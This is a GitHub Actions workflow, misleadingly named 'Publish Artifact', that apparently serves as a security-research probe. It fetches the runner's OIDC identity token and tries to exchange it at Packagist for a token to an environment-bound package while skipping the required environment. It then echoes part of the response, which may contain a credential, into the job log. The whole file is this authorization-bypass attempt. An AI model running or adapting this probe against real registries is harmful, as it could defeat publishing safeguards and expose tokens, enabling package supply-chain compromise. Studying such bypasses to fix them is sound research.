name: Publish Artifact
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Exchange for env-bound package WITHOUT using the environment
        run: |
          ORG=pkresearchlab
          PKG=g4rrzx/env-pkg
          AUD=$(curl -sS "https://packagist.com/api/oidc/audience/$ORG" | jq -r .audience)
          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value)
          CODE=$(curl -sS -o /tmp/c.json -w '%{http_code}' -X POST -H "Authorization: Bearer $JWT" "https://packagist.com/api/oidc/token-exchange/$ORG/$PKG")
          echo "NO-ENVIRONMENT exchange HTTP=$CODE"
          head -c 300 /tmp/c.json
